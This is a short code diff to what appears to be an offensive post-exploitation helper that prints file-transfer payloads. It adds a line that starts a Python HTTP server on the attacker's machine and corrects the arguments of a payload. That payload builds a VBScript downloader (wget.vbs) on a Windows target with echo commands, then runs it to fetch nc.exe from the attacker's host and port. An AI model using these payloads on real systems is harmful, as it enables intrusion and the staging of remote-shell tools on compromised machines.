@@ -711,6 +711,7 @@ ftp -v -n -s:ftp.txt
             file = 'nc.exe'
 
         _payload = '''
+python3 -m http.server %s
 --------------------------------------------------------------------------------------
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -739,7 +740,7 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ---------------------------------------------------------------------------------------
 cscript wget.vbs http://%s:%s/%s %s
-    ''' % (lhost, lport, file, file)
+    ''' % (lport, lhost, lport, file, file)
         print('')
         print(_payload)
         print('')
